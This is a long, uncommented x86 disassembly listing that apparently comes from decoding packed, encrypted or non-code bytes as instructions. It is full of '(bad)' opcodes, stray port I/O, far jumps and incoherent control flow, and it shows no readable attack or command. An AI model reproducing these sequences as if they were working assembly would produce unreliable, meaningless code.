  425e44:	push   ebx
  425e45:	mov    al,ds:0x41a6e8ab
  425e4a:	je     0x425e98
  425e4c:	fnstenv [esi]
  425e4e:	into   
  425e4f:	or     esp,esi
  425e51:	mov    dh,0x15
  425e53:	or     al,0x27
  425e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e56:	js     0x425e9c
  425e58:	fnsave [edi]
  425e5a:	test   eax,0xf78becd2
  425e5f:	jp     0x425e4d
  425e61:	jle    0x425e8c
  425e63:	push   0xfffffff4
  425e65:	fld    TBYTE PTR [esi+esi*1-0x1f]
  425e69:	aas    
  425e6a:	mov    dh,0x95
  425e6c:	(bad)  
  425e6e:	or     eax,0x214acf6f
  425e73:	jo     0x425e1e
  425e75:	or     bl,BYTE PTR [esi+0x2edd6df1]
  425e7b:	dec    edi
  425e7c:	sbb    BYTE PTR [ebx],0x25
  425e7f:	mov    dl,BYTE PTR [ecx-0x61]
  425e82:	and    eax,0x31382bc3
  425e87:	fwait
  425e88:	add    DWORD PTR [esi+0x307a6555],0x93c36ec5
  425e92:	lods   eax,DWORD PTR ds:[esi]
  425e93:	inc    ecx
  425e94:	and    DWORD PTR [eax-0x18],ecx
  425e97:	push   esp
  425e98:	pop    eax
  425e99:	xchg   esi,eax
  425e9a:	sbb    eax,esi
  425e9c:	dec    edi
  425e9d:	add    ecx,DWORD PTR [edx+edx*1+0x706d748a]
  425ea4:	ret    
  425ea5:	adc    DWORD PTR [ebp-0x7498702b],ebx
  425eab:	lods   al,BYTE PTR ds:[esi]
  425eac:	lea    edx,[eax-0x4a]
  425eaf:	mov    bh,0x6a
  425eb1:	mov    al,0x43
  425eb3:	test   eax,0x5b3541e
  425eb8:	jl     0x425eed
  425eba:	out    dx,eax
  425ebb:	outs   dx,BYTE PTR ds:[esi]
  425ebc:	add    bl,bh
  425ebe:	inc    esp
  425ebf:	popa   
  425ec0:	jmp    0x425ef7
  425ec2:	push   ss
  425ec3:	lock enter 0x65ed,0xbb
  425ec8:	fmul   QWORD PTR [ecx+0x51961fd8]
  425ece:	xor    DWORD PTR [ebx],edi
  425ed0:	addr16 sahf 
  425ed2:	add    BYTE PTR [edx],ch
  425ed4:	and    edi,DWORD PTR ds:[edi]
  425ed7:	stos   DWORD PTR es:[edi],eax
  425ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ed9:	sub    DWORD PTR [ecx],edx
  425edb:	int    0xed
  425edd:	jl     0x425e93
  425edf:	out    0x96,al
  425ee1:	and    eax,0xe1bc1b0
  425ee6:	and    eax,0x83efa9f5
  425eeb:	or     eax,0x4dec5f66
  425ef0:	jl     0x425e86
  425ef2:	mov    cl,0x4c
  425ef4:	cli    
  425ef5:	jmp    0xde010f30
  425efa:	jge    0x425ef0
  425efc:	and    edi,edx
  425efe:	adc    al,0xf6
  425f00:	mov    ecx,0xc8a23050
  425f05:	outs   dx,BYTE PTR ss:[esi]
  425f07:	sub    BYTE PTR [ebp+0x7712281c],ah
  425f0d:	pop    ss
  425f0e:	jmp    0x425f33
  425f10:	pop    ecx
  425f11:	and    bl,BYTE PTR [ebx-0x10]
  425f14:	jge    0x425f58
  425f16:	jo     0x425ef6
  425f18:	add    ebp,ebp
  425f1a:	inc    esp
  425f1b:	inc    edx
  425f1c:	call   DWORD PTR [edx+ebx*1-0x6ff85e84]
  425f23:	jmp    0x7fe1:0xcf71de50
  425f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f2b:	jae    0x425eea
  425f2d:	icebp  
  425f2e:	scas   al,BYTE PTR es:[edi]
  425f2f:	sub    esi,ecx
  425f31:	test   al,0xb8
  425f33:	xchg   ecx,eax
  425f34:	add    eax,0x418cf819
  425f39:	sub    al,0xd2
  425f3b:	shl    DWORD PTR [edx],cl
  425f3d:	dec    ebx
  425f3e:	adc    DWORD PTR [ebx+esi*4-0x1c],ebp
  425f42:	cmove  ecx,edx
  425f45:	sbb    esi,DWORD PTR cs:[ebp+ecx*8-0x625d41e]
  425f4d:	imul   dx,WORD PTR [edi-0x30b159d1],0x74e5
  425f56:	adc    BYTE PTR [esi],0x8d
  425f59:	repnz stos BYTE PTR es:[edi],al
  425f5b:	adc    al,0xc7
  425f5d:	rep ins BYTE PTR es:[edi],dx
  425f5f:	jmp    0x9a9b:0x89093573
  425f66:	retf   
  425f67:	and    edi,esi
  425f69:	xchg   BYTE PTR [edi+0x6b],ch
  425f6c:	xor    al,0x15
  425f6e:	jb     0x425f9f
  425f70:	pushf  
  425f71:	dec    ebx
  425f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f73:	mov    ch,0x43
  425f75:	lock jnp 0x425f16
  425f78:	lahf   
  425f79:	mov    dh,0xf
  425f7b:	xchg   DWORD PTR [esi],ebp
  425f7d:	out    0x9,al
  425f7f:	adc    al,0xda
  425f81:	or     bl,BYTE PTR [eax-0x2d0af53d]
  425f87:	push   edx
  425f88:	xor    DWORD PTR [eax],ecx
  425f8a:	clflush BYTE PTR [eax+ebx*2]
  425f8e:	aaa    
  425f8f:	popa   
  425f90:	(bad)  [esi+0x32]
  425f93:	sbb    edi,DWORD PTR [edi-0x4b]
  425f96:	jbe    0x425fa6
  425f98:	push   edi
  425f99:	inc    edx
  425f9a:	adc    eax,0xa122630
  425f9f:	dec    edx
  425fa0:	push   ss
  425fa1:	lds    ebx,FWORD PTR [edi-0x6b73869e]
  425fa7:	sbb    edx,DWORD PTR [eax-0x57]
  425faa:	out    0xb2,eax
  425fac:	repnz fsub DWORD PTR [ecx+edi*4]
  425fb0:	dec    edx
  425fb1:	iret   
  425fb2:	push   ebp
  425fb3:	fisubr DWORD PTR [edx+0x37]
  425fb6:	sbb    al,0x1a
  425fb8:	pop    ebx
  425fb9:	pcmpgtw mm5,mm6
  425fbc:	mov    BYTE PTR [ecx+0x49],cl
  425fbf:	inc    esp
  425fc0:	out    dx,al
  425fc1:	cmp    esi,DWORD PTR [edx]
  425fc3:	repnz add DWORD PTR [ebx],edi
  425fc6:	ret    0xe482
  425fc9:	bswap  edi
  425fcb:	mov    eax,0x9934d7e7
  425fd0:	jp     0x425fd9
  425fd2:	jmp    0x425fec
  425fd4:	jmp    0xcc78cf3f
  425fd9:	lds    esp,FWORD PTR [edi+0x256df5f9]
  425fdf:	ret    0x823c
  425fe2:	push   eax
  425fe3:	fild   WORD PTR [esp+edx*2+0x6cc09ccd]
  425fea:	mov    ecx,0x96c1d7b3
  425fef:	push   eax
  425ff0:	pop    ecx
  425ff1:	repnz inc edi
  425ff3:	lods   al,BYTE PTR ds:[esi]
  425ff4:	clc    
  425ff5:	ins    BYTE PTR es:[edi],dx
  425ff6:	inc    ecx
  425ff7:	dec    ecx
  425ff8:	inc    edx
  425ff9:	rcl    ebx,0x38
  425ffc:	dec    edx
  425ffd:	mov    eax,ds:0xab19f028
  426002:	mov    esi,0xd13a099b
  426007:	loopne 0x426002
  426009:	cmp    edx,DWORD PTR [edi+ebx*2]
  42600c:	lea    edx,[edx]
  42600e:	fs mov edx,edi
  426011:	sub    bl,BYTE PTR ds:0xbd2bb7a0
  426017:	shr    DWORD PTR [ebx+ebx*1],0xe6
  42601b:	sbb    ebp,DWORD PTR [ebp+0x7c]
  42601e:	clc    
  42601f:	nop
  426020:	inc    esi
  426021:	dec    edx
  426022:	call   0x1c7d3c0f
  426027:	xlat   BYTE PTR ds:[ebx]
  426028:	dec    di
  42602a:	stos   BYTE PTR es:[edi],al
  42602b:	mov    ah,0xaf
  42602d:	jmp    0x425ff9
  42602f:	lods   eax,DWORD PTR ds:[esi]
  426030:	bound  ebp,QWORD PTR [edi-0x48]
  426033:	jb     0x42609e
  426035:	fnstsw WORD PTR [esi-0x5d]
  426038:	out    dx,al
  426039:	lahf   
  42603a:	out    0x7f,eax
  42603c:	sbb    BYTE PTR [ebp+0x14847f7b],dl
  426042:	sar    edi,0xe3
  426045:	mov    edi,ebp
  426047:	or     DWORD PTR [ecx+0x0],esi
  42604a:	sub    eax,0x90dab1cc
  42604f:	cld    
  426050:	pushf  
  426051:	mov    WORD PTR [eax+0x45],ss
  426054:	cmp    bh,bl
  426056:	adc    eax,0x5b50b0b0
  42605b:	pop    ebp
  42605c:	jmp    0xdc37:0x8395276f
  426063:	shl    BYTE PTR [ecx-0x2f],cl
  426066:	(bad)  
  426067:	aaa    
  426068:	sub    al,0x8d
  42606a:	mov    edi,0x73ca77b4
  42606f:	xchg   esp,eax
  426070:	jle    0x426075
  426072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426073:	push   esp
  426074:	xor    DWORD PTR [eax+0x32],0xbf225641
  42607b:	cli    
  42607c:	fwait
  42607d:	xor    bl,bh
  42607f:	and    edi,esp
  426081:	or     al,0x66
  426083:	call   DWORD PTR [esi]
  426085:	sub    esi,DWORD PTR [edx-0x22]
  426088:	push   edx
  426089:	fistp  QWORD PTR [edi-0x5f]
  42608c:	mov    ch,0xd9
  42608e:	icebp  
  42608f:	mov    ss,eax
  426091:	cmp    DWORD PTR [ebp+0x577fbc04],edi
  426097:	popf   
  426098:	not    BYTE PTR [ebp+0x65]
  42609b:	dec    edx
  42609c:	mov    al,0x9
  42609e:	sti    
  42609f:	aad    0x7b
  4260a1:	(bad)  
  4260a2:	mov    es,esi
  4260a4:	push   esi
  4260a5:	ret    0x6b37
  4260a8:	mov    esi,0x90d3ed2a
  4260ad:	es pop ebp
  4260af:	jl     0x4260f7
  4260b1:	jno    0x4260b6
  4260b3:	push   es
  4260b4:	test   ebp,esp
  4260b6:	pop    DWORD PTR ds:0xc67f628c
  4260bc:	pop    ss
  4260bd:	(bad)  
  4260be:	cli    
  4260bf:	or     BYTE PTR [ebx+0x25],ah
  4260c2:	sbb    dl,BYTE PTR [edi]
  4260c4:	mov    ebx,0x599c34df
  4260c9:	fild   DWORD PTR [edx-0xe36b2f6]
  4260cf:	mov    edi,0x2b1ed326
  4260d4:	jns    0x4260c2
  4260d6:	fmul   QWORD PTR [edx]
  4260d8:	adc    al,0x2e
  4260da:	adc    ebx,esi
  4260dc:	call   0xedcd:0xbcdc791b
  4260e3:	xchg   edi,eax
  4260e4:	js     0x426068
  4260e6:	push   esi
  4260e7:	or     al,0x6d
  4260e9:	mov    ds:0x18180f02,eax
  4260ee:	add    bl,BYTE PTR [esi+0x32]
  4260f1:	xor    dh,BYTE PTR [esi+0x3d]
  4260f4:	mov    esp,ebp
  4260f6:	and    BYTE PTR [esi-0x4c512ba8],al
  4260fc:	add    ebx,DWORD PTR [esi]
  4260fe:	fist   DWORD PTR [ecx+0x7db13593]
  426104:	jecxz  0x42614b
  426106:	sub    ebx,edx
  426108:	jge    0x42615f
  42610a:	fbstp  TBYTE PTR [ebx-0x66f8fbdd]
  426110:	test   BYTE PTR [ecx],al
  426112:	pop    ecx
  426113:	(bad)  
  426114:	(bad)  
  426115:	imul   esp,DWORD PTR [esi+0x4df89af2],0xd6771bf2
  42611f:	loope  0x4260cc
  426121:	hlt    
  426122:	test   BYTE PTR [esi],cl
  426124:	inc    ebp
  426125:	inc    edx
  426126:	addr16 push es
  426128:	pop    ds
  426129:	fbld   TBYTE PTR [ebp+0x6f181405]
  42612f:	add    eax,0x37eb028d
  426134:	mov    edx,0x831ad68b
  426139:	sbb    al,0x5b
  42613b:	hlt    
  42613c:	push   ss
  42613d:	scas   al,BYTE PTR es:[edi]
  42613e:	pop    ds
  42613f:	inc    ebp
  426140:	adc    eax,0x94c260a3
  426145:	sub    DWORD PTR [ebx-0x18bfa5e9],0x27
  42614c:	cli    
  42614d:	mov    esi,0x645a7807
  426152:	xor    al,0x83
  426154:	imul   esi,DWORD PTR [ebx],0x190d3650
  42615a:	scas   al,BYTE PTR es:[edi]
  42615b:	hlt    
  42615c:	lahf   
  42615d:	outs   dx,BYTE PTR ds:[esi]
  42615e:	arpl   dx,di
  426160:	outs   dx,BYTE PTR ds:[esi]
  426161:	sub    al,0x31
  426163:	add    eax,0x8983ceb5
  426168:	cmp    eax,DWORD PTR [edx]
  42616a:	dec    edx
  42616b:	icebp  
  42616c:	in     eax,0xac
  42616e:	in     eax,dx
  42616f:	rol    DWORD PTR [ebp+0x1a],1
  426172:	std    
  426173:	(bad)  
  426174:	push   0x21
  426176:	loopne 0x42612c
  426178:	popa   
  426179:	jbe    0x42617e
  42617b:	and    al,0x80
  42617d:	das    
  42617e:	addr16 ss jl 0x426119
  426182:	mov    bl,ch
  426184:	mov    dl,0x16
  426186:	mov    ebp,0x5270e7f0
  42618b:	cmp    eax,0x65d7f9df
  426190:	lds    esp,FWORD PTR [ebx]
  426192:	retf   
  426193:	dec    ecx
  426194:	inc    ecx
  426195:	dec    edi
  426196:	push   0x16
  426198:	add    al,0xe5
  42619a:	cmp    al,0xbb
  42619c:	mov    edx,0x907de381
  4261a1:	inc    ecx
  4261a2:	repnz ror edx,1
  4261a5:	adc    al,0x92
  4261a7:	call   0x436527ab
  4261ac:	in     al,dx
  4261ad:	out    0x11,al
  4261af:	dec    ebx
  4261b0:	cdq    
  4261b1:	aad    0x2f
  4261b3:	inc    ecx
  4261b4:	pop    ebp
  4261b5:	mov    al,0xdd
  4261b7:	sahf   
  4261b8:	sub    al,0xa6
  4261ba:	mov    eax,ds:0x1edfdf7c
  4261bf:	pop    ss
  4261c0:	ds push es
  4261c2:	sub    eax,0x1689635e
  4261c7:	add    ch,BYTE PTR [ecx]
  4261c9:	mov    ch,0xbf
  4261cb:	ss fs jp 0x42616c
  4261cf:	in     eax,0x88
  4261d1:	adc    eax,0x7abb5261
  4261d6:	les    esp,FWORD PTR [edx+0x2f81417e]
  4261dc:	mov    ch,al
  4261de:	les    esi,FWORD PTR [ecx-0x2decec2e]
  4261e4:	cmp    DWORD PTR [ebp+eiz*2-0x4477b92b],ebx
  4261eb:	icebp  
  4261ec:	je     0x4261cf
  4261ee:	cmp    al,0xad
  4261f0:	add    al,0x75
  4261f2:	sub    al,BYTE PTR [ebp+0x56636d9]
  4261f8:	fisttp QWORD PTR [ebp-0x6]
  4261fb:	popf   
  4261fc:	rol    edi,1
  4261fe:	and    bh,ah
  426200:	and    eax,0x6b687eaa
  426205:	mov    cs,WORD PTR [ecx+ebp*1]
  426208:	sbb    ebp,0xffffffc1
  42620b:	in     al,dx
  42620c:	cld    
  42620d:	outs   dx,BYTE PTR ds:[esi]
  42620e:	and    edi,DWORD PTR [eax+ecx*8]
  426211:	int3   
  426212:	stos   DWORD PTR es:[edi],eax
  426213:	ret    
  426214:	push   cs
  426215:	mov    bl,0xaa
  426217:	add    esi,DWORD PTR [esi-0x25844065]
  42621d:	xor    BYTE PTR [edx-0x72],bh
  426220:	in     eax,0xfe
  426222:	mov    esi,0xe5f5962b
  426227:	jb     0x426238
  426229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42622a:	loope  0x426290
  42622c:	(bad)  
  42622d:	fcomi  st,st(6)
  42622f:	data16 aaa 
  426231:	(bad)  
  426232:	frstor [esi]
  426234:	(bad)
  426237:	sti    
  426238:	in     al,0x81
  42623a:	jg     0x426285
  42623c:	add    bl,dh
  42623e:	loopne 0x4261e7
  426240:	out    0x8,al
  426242:	mov    eax,0x4371f6c7
  426247:	cwde   
  426248:	mov    esi,0x4e3cff20
  42624d:	jg     0x4262cc
  42624f:	or     ebp,DWORD PTR [esp+edi*8]
  426252:	add    eax,0x33e0868d
  426257:	or     eax,0x497c7a05
  42625c:	push   ecx
  42625d:	mov    ebx,0xe0f43866
  426262:	test   eax,0x9d5d53e5
  426267:	repnz sbb edi,ebx
  42626a:	cld    
  42626b:	pop    edx
  42626c:	add    BYTE PTR [esi+eax*1],0x0
  426270:	push   edi
  426271:	and    BYTE PTR ds:0xbef514fb,bl
  426277:	outs   dx,BYTE PTR ds:[esi]
  426278:	mov    esp,0x76b7740d
  42627d:	inc    esp
  42627e:	add    BYTE PTR [eax],al
  426280:	add    BYTE PTR [eax],al
  426282:	jno    0x426247
  426284:	loop   0x426271
  426286:	bnd jmp 0x426302
  426289:	fcomi  st,st(7)
  42628b:	mov    edi,db7
  42628e:	or     al,0x42
  426290:	aaa    
  426291:	(bad)  
  426292:	std    
  426293:	fiadd  DWORD PTR [ecx]
  426295:	add    ah,dh
  426297:	add    al,0x0
  426299:	add    BYTE PTR [ebp+0xb],al
  42629c:	xchg   ebx,eax
  42629d:	dec    ecx
  42629e:	out    dx,al
  42629f:	add    eax,0x64f5fec8
  4262a4:	lods   al,BYTE PTR ds:[esi]
  4262a5:	xchg   ebx,eax
  4262a6:	test   DWORD PTR [eax],edi
  4262a8:	mov    eax,ds:0xbfcb52fa
  4262ad:	xchg   esi,eax
  4262ae:	leave  
  4262af:	cmp    ebp,DWORD PTR [ebp-0x44]
  4262b2:	dec    ebp
  4262b3:	imul   ebp,DWORD PTR [esi+0x1b52e5f3],0x2d74f8bd
  4262bd:	mov    ds:0xb10208b5,eax
  4262c2:	out    0x85,eax
  4262c4:	pop    ds
  4262c5:	int3   
  4262c6:	rcl    BYTE PTR [esi-0xb],1
  4262c9:	lods   eax,DWORD PTR ds:[esi]
  4262ca:	fwait
  4262cb:	mov    edi,DWORD PTR [edx-0x52]
  4262ce:	sub    eax,ebx
  4262d0:	dec    ecx
  4262d1:	push   0xbde8fc5
  4262d6:	dec    eax
  4262d7:	data16 mov dl,0x64
  4262da:	mov    dh,0x8f
  4262dc:	int3   
  4262dd:	out    dx,eax
  4262de:	lods   eax,DWORD PTR ds:[esi]
  4262df:	sub    eax,0xa6e10364
  4262e4:	jmp    0x4262c8
  4262e6:	cmc    
  4262e7:	sti    
  4262e8:	sub    dl,BYTE PTR [ecx+0x2]
  4262eb:	fisttp WORD PTR [edi+0x2b9704c9]
  4262f1:	jmp    0x7f2b:0x8a26c111
  4262f8:	push   eax
  4262f9:	or     al,0x77
  4262fb:	repnz lea eax,[eax+0x124c4f67]
  426302:	retf   0xd006
  426305:	test   BYTE PTR [eax+0x4],dh
  426308:	jle    0x42633e
  42630a:	ins    BYTE PTR es:[edi],dx
  42630b:	inc    esp
  42630c:	jae    0x4262db
  42630e:	xor    DWORD PTR [edi-0x12],0x79
  426312:	jecxz  0x4262b1
  426314:	sbb    al,0xdf
  426316:	lds    edi,FWORD PTR [esi]
  426318:	(bad)  
  426319:	fsubr  DWORD PTR [esi+0x4848c85e]
  42631f:	repnz push esp
  426321:	push   0x6d11c0dc
  426326:	sbb    al,bl
  426328:	push   0x675e9229
  42632d:	into   
  42632e:	inc    ebx
  426330:	ret    
  426331:	ret    
  426332:	adc    eax,0x3623327c
  426337:	cli    
  426338:	inc    ebx
  426339:	and    dh,cl
  42633b:	adc    ch,dh
  42633d:	in     al,0x64
  42633f:	je     0x4263bd
  426341:	lods   al,BYTE PTR ds:[esi]
  426342:	js     0x42630d
  426344:	jno    0x426335
  426346:	cld    
  426347:	sub    dl,BYTE PTR [ebp+eiz*4-0x27]
  42634b:	ficomp DWORD PTR [ebx-0x45]
  42634e:	sub    eax,0x606278db
  426353:	in     al,dx
  426354:	push   edx
  426355:	(bad)  
  426356:	xchg   ecx,eax
  426357:	imul   DWORD PTR [ecx-0x3f]
  42635a:	fistp  QWORD PTR [eax]
  42635c:	push   cs
  42635d:	and    eax,0xf378e8d9
  426362:	lock sbb edx,DWORD PTR [ebx+0x7456657b]
  426369:	in     eax,0xec
  42636b:	das    
  42636c:	sbb    ah,ah
  42636e:	inc    ebp
  42636f:	mov    ds:0x565c1f7,eax
  426374:	inc    esi
  426375:	sbb    cl,cl
  426377:	std    
  426378:	xor    cl,BYTE PTR [edi]
  42637a:	mov    eax,ds:0x3b85ab0
  42637f:	(bad)  
  426380:	xlat   BYTE PTR ds:[ebx]
  426381:	mov    ch,0xea
  426383:	jo     0x42630e
  426385:	or     dh,BYTE PTR [ebx]
  426387:	or     BYTE PTR [ebx-0x51526ec0],dl
  42638d:	xchg   ebp,eax
  42638e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42638f:	and    al,0x25
  426391:	dec    edi
  426392:	jp     0x4263fd
  426394:	add    esp,esi
  426396:	xor    BYTE PTR [edi],dl
  426398:	shl    DWORD PTR [ebx],0x88
  42639b:	dec    esi
  42639c:	pop    edx
  42639d:	not    BYTE PTR [esi+0x57]
  4263a0:	xor    eax,0x6c55be1c
  4263a5:	mov    edx,0x853848bc
  4263aa:	mov    al,BYTE PTR [edx]
  4263ac:	shl    DWORD PTR [ecx-0x38c9b06b],cl
  4263b2:	das    
  4263b3:	xor    esp,DWORD PTR [eax+eiz*2+0x6d]
  4263b7:	lahf   
  4263b8:	cmp    al,0xc4
  4263ba:	aaa    
  4263bb:	inc    ebx
  4263bc:	dec    ecx
  4263bd:	xor    al,0x2e
  4263bf:	mov    edi,0x14dc1370
  4263c4:	sub    ebp,esp
  4263c6:	lea    eax,[ecx+0x557d2b1f]
  4263cc:	sbb    al,0xbf
  4263ce:	push   cs
  4263cf:	fwait
  4263d0:	mov    ds:0x695b8bd5,al
  4263d5:	dec    esi
  4263d6:	pop    ss
  4263d7:	add    eax,0x8cec4493
  4263dc:	lahf   
  4263dd:	xor    eax,0x8c3b5b9b
  4263e2:	pop    ebp
  4263e3:	call   0xc401:0xc3ce6797
  4263ea:	shl    BYTE PTR [ebx-0x3edfab65],cl
  4263f0:	pop    ecx
  4263f1:	fld    DWORD PTR [ebx]
  4263f3:	adc    eax,0x9b463cf5
  4263f8:	sub    eax,0x541e513d
  4263fd:	ret    0x432d
  426400:	pop    ss
  426401:	pop    ebx
  426402:	add    ch,BYTE PTR [edx-0x64]
  426405:	pop    edi
  426406:	in     eax,0x89
  426408:	push   cs
  426409:	pop    ss
  42640a:	cs fsubr st(0),st
  42640d:	std    
  42640e:	mov    WORD PTR [edi-0x4e204774],gs
  426414:	inc    ecx
  426415:	jne    0x426424
  426417:	dec    esp
  426418:	and    DWORD PTR [eax],ecx
  42641a:	cmp    eax,0x7638e367
  42641f:	out    0x67,al
  426421:	cmp    dl,BYTE PTR [eax+0x1b]
  426424:	xchg   edx,eax
  426425:	fld    QWORD PTR [edx]
  426427:	xor    cl,ah
  426429:	mov    al,ds:0x27ef7a72
  42642e:	stos   BYTE PTR es:[edi],al
  42642f:	push   ebp
  426430:	mov    eax,ds:0x36e53723
  426435:	lock fadd st,st(0)
  426438:	popa   
  426439:	sub    BYTE PTR [ebp+0x3d9ea81c],dh
  42643f:	mov    dl,BYTE PTR [eax]
  426441:	fidiv  WORD PTR [ebp+0x22]
  426444:	add    al,0x3d
  426446:	cmp    eax,0x5c5be22a
  42644b:	jnp    0x42642a
  42644d:	aaa    
  42644e:	sub    ch,ch
  426450:	sub    BYTE PTR [edx-0x509f0e50],0x1d
  426457:	scas   al,BYTE PTR es:[edi]
  426458:	loopne 0x42643f
  42645a:	into   
  42645b:	and    ah,dl
  42645d:	mov    esi,0x5b5c4005
  426462:	loopne 0x4263f2
  426464:	hlt    
  426465:	jmp    0x1f0711ca
  42646a:	retf   
  42646b:	rol    DWORD PTR [edx+0x24f1cefc],0x1c
  426472:	retf   
  426473:	(bad)  
  426474:	rol    DWORD PTR [ebp-0x3],0x98
  426478:	or     BYTE PTR [ecx+0x7a],bl
  42647b:	pop    ss
  42647c:	(bad)  
  42647d:	(bad)  
  42647f:	cdq    
  426480:	jg     0x426469
  426482:	adc    DWORD PTR [ecx-0x6b],ebx
  426485:	clc    
  426486:	jg     0x4264ee
  426488:	(bad)  
  426489:	stos   DWORD PTR es:[edi],eax
  42648a:	add    ebp,ebp
  42648c:	loopne 0x426452
  42648e:	or     bh,dh
  426490:	int    0xc8
  426492:	jne    0x426429
  426494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426495:	arpl   WORD PTR [ecx+0x17],bp
  426498:	mov    cl,BYTE PTR [edx-0x95edc]
  42649e:	mov    dh,0x1e
  4264a0:	mov    esp,0x2f21cc08
  4264a5:	jmp    0x58901e47
  4264aa:	lock mov esp,0x676a3060
  4264b0:	nop
  4264b1:	jl     0x42650c
  4264b3:	icebp  
  4264b4:	mov    ebx,0xa2b90ddc
  4264b9:	dec    ebx
  4264ba:	mov    ds:0xdd76b0b6,al
  4264bf:	sub    dh,BYTE PTR [ebx+0x39d6b88f]
  4264c5:	shr    BYTE PTR [edi-0x7e99f85d],cl
  4264cb:	mov    edi,0x48edb5e2
  4264d0:	cmp    bl,bh
  4264d2:	outs   dx,BYTE PTR ds:[esi]
  4264d3:	mov    dl,0xa6
  4264d5:	ds mov ch,0xf7
  4264d8:	jae    0x426533
  4264da:	cmp    BYTE PTR [edx+0x78],0x8d
  4264de:	jb     0x4264dd
  4264e0:	cmp    edx,DWORD PTR [edi+0x66]
  4264e3:	shr    DWORD PTR [ebx-0x55],0x0
  4264e7:	push   ss
  4264e8:	mov    WORD PTR [esi-0x402845c2],?
  4264ee:	leave  
  4264ef:	dec    edi
  4264f0:	pop    eax
  4264f1:	adc    edi,eax
  4264f3:	jmp    0x42649a
  4264f5:	in     al,dx
  4264f6:	push   esi
  4264f7:	push   eax
  4264f8:	mov    bl,0xb5
  4264fa:	adc    cl,bh
  4264fc:	inc    esp
  4264fd:	in     eax,0xa0
  4264ff:	aad    0x71
  426501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426502:	(bad)  
  426503:	hlt    
  426504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426505:	(bad)  
  426506:	aam    0xfd
  426508:	mov    edx,0x851a57cf
  42650d:	mov    ebx,ebx
  42650f:	sub    dl,BYTE PTR [esp+edi*1+0x56]
  426513:	sub    dl,0x23
  426516:	adc    ecx,ebx
  426518:	push   ebp
  426519:	adc    DWORD PTR [edi],0xffffffaf
  42651c:	push   ss
  42651d:	rol    DWORD PTR [edx-0x54862d84],0xd3
  426524:	sahf   
  426525:	mov    ah,0x4e
  426527:	nop    DWORD PTR [ebp+0x2]
  42652b:	add    ebx,DWORD PTR [ebx+0x10]
  42652e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42652f:	mov    es,WORD PTR [eax-0x1ee5bd7b]
  426535:	retf   
  426536:	push   edx
  426537:	xor    al,0xc0
  426539:	cld    
  42653a:	push   eax
  42653b:	push   ebp
  42653c:	aas    
  42653d:	nop
  42653e:	in     al,0xf7
  426540:	jo     0x42652e
  426542:	add    eax,0x55dcef36
  426547:	inc    edx
  426548:	out    dx,al
  426549:	fnstcw WORD PTR [esi+0x2e]
  42654c:	fucom  st(1)
  42654e:	sub    al,0x7
  426550:	mov    edx,0x645fb702
  426555:	push   ebx
  426556:	inc    esp
  426557:	push   ecx
  426558:	or     al,0xb8
  42655a:	das    
  42655b:	push   esi
  42655c:	sub    al,0x50
  42655e:	icebp  
  42655f:	popa   
  426560:	(bad)  
  426561:	daa    
  426562:	out    dx,al
  426563:	cs or  eax,0xcc78fecc
  426569:	pop    ds
  42656a:	xlat   BYTE PTR ds:[ebx]
  42656b:	mov    ch,0xe4
  42656d:	hlt    
  42656e:	pop    esi
  42656f:	pop    ss
  426570:	add    DWORD PTR [edx-0x4c],ebx
  426573:	jno    0x42652e
  426575:	inc    ecx
  426576:	jmp    0x8bdf:0xc4eb673e
  42657d:	xchg   BYTE PTR [eax+0x6c1d0e89],dl
  426583:	out    dx,al
  426584:	out    dx,eax
  426585:	ret    0x8c8d
  426588:	mov    dl,0xf5
  42658a:	(bad)  
  42658b:	(bad)  
  42658c:	jle    0x426513
  42658e:	fadd   st,st(4)
  426590:	xchg   ecx,eax
  426591:	adc    DWORD PTR [edi-0x50],eax
  426594:	popa   
  426595:	inc    esp
  426596:	jge    0x42656a
  426598:	and    BYTE PTR [edi-0x2ddc388e],dl
  42659e:	xchg   edx,eax
  42659f:	jmp    0xe9b:0x51c857d8
  4265a6:	out    0xff,eax
  4265a8:	stos   DWORD PTR es:[edi],eax
  4265a9:	cmp    DWORD PTR [edi+0x5a],edi
  4265ac:	sbb    edx,DWORD PTR [ebp+0x12]
  4265af:	test   al,0x75
  4265b1:	pop    esp
  4265b2:	in     al,dx
  4265b3:	loopne 0x4265d8
  4265b5:	dec    edi
  4265b6:	sbb    BYTE PTR [ebp+0x3d],bl
  4265b9:	adc    eax,0x243dddc7
  4265be:	pop    esp
  4265bf:	sub    BYTE PTR [esi],cl
  4265c1:	cmp    edx,ebx
  4265c3:	das    
  4265c4:	scas   al,BYTE PTR es:[edi]
  4265c5:	add    al,0xcf
  4265c7:	pushf  
  4265c8:	add    DWORD PTR [ebx-0x66],ecx
  4265cb:	test   BYTE PTR [ebp+0x741c3ed7],dl
  4265d1:	sti    
  4265d2:	pop    edx
  4265d3:	out    dx,al
  4265d4:	xchg   edi,eax
  4265d5:	pop    ss
  4265d6:	push   DWORD PTR [eax+0x21]
  4265d9:	fld    DWORD PTR [ebx-0x4f]
  4265dc:	popf   
  4265dd:	fs or  ch,ch
  4265e0:	mov    ebx,edi
  4265e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265e4:	enter  0xd598,0xf6
  4265e8:	loopne 0x426635
  4265ea:	and    DWORD PTR [edi],edi
  4265ec:	lea    esp,[ebp-0x2b]
  4265ef:	or     al,0xf3
  4265f1:	add    DWORD PTR [ecx+0x1],edi
  4265f4:	(bad)  
  4265f5:	out    0xa3,eax
  4265f7:	mov    ds:0x79ec308,al
  4265fc:	adc    eax,0x6a11ec9f
  426601:	jae    0x4265db
  426603:	test   al,0x7d
  426605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426606:	push   es
  426607:	mov    ds:0xd1532435,eax
  42660c:	outs   dx,DWORD PTR ds:[esi]
  42660d:	scas   al,BYTE PTR es:[edi]
